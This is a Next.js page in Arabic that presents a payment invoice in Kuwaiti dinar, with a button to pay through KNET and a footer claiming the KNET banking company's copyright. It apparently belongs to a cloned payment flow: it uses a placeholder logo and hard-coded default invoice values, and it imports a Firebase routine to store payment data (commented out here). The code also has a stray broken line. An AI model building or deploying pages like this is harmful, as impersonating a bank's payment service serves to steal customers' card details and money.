'use client';

import Image from 'next/image';
import { useRouter } from 'next/navigation';
import { usePayment } from '@/contexts/payment-context';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import type React from 'react'; // Added import for React
import { addData } from '@/lib/firebase-service';
import Link from 'next/link';

export default function InvoicePage() {
  const router = useRouter();
  const { paymentData, setPaymentData } = usePayment();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
   -// addData(paymentData)
    router.push('/payment');
  };

  return (
    <div className="max-w-md mx-auto p-4 space-y-6" dir="rtl">
      <div className="w-full h-32 relative rounded-lg overflow-hidden text-center flex justify-center">
        <Image
          src={`/mor.svg`}
          alt="Customer Service Banner"
          width={107}
          height={170}
          className="object-contain"
        />
      </div>

      <div className="bg-white rounded-lg shadow-lg p-6 space-y-6">
        <div className="flex justify-center">
          <Image
            src="/next.svg"
            alt="Tasdeed Logo"
            width={150}
            height={50}
            className="h-12 w-auto"
          />
        </div>

        <div className="space-y-4">
          <div className="flex justify-between">
            <span className="font-bold">الفاتورة:</span>
            <span>{paymentData.invoiceNumber || '4526888'}</span>
          </div>

          <div className="flex justify-between">
            <span className="font-bold">القيمة:</span>
            <span>{paymentData.amount || '5.000'} دينار كويتي</span>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
       
<Link href={'/payment'} className='py-2'>
          <Button type="submit" className="w-full m-1">
         الدفع من خلال <Image src={'/knet.png'} height={40} width={40} alt='kent'/>
          </Button>
          </Link>

        </form>
      </div>

      <footer className="text-center text-sm text-gray-600">
        <p>© All Rights Reserved, Copyright 2025</p>
        <p>The Shared Electronic Banking Services Company - KNET</p>
      </footer>
    </div>
  );
}
